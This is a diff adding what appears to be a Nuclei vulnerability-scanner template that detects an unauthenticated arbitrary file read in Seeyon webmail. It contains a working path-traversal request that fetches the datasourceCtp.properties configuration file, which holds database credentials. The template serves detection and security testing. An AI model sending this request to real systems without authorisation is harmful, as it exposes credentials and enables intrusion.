@@ -1,0 +1,25 @@
+id: seeyon-webmail-file-read
+
+info:
+  name: Seeyon webmail Arbitrary File Read
+  author: local
+  severity: high
+  description: Detects unauthenticated file disclosure through webmail.do.
+  tags: seeyon,zhiyuan,file-read,active
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'workflow'
+          - 'ctpDataSource'
+        condition: and
+
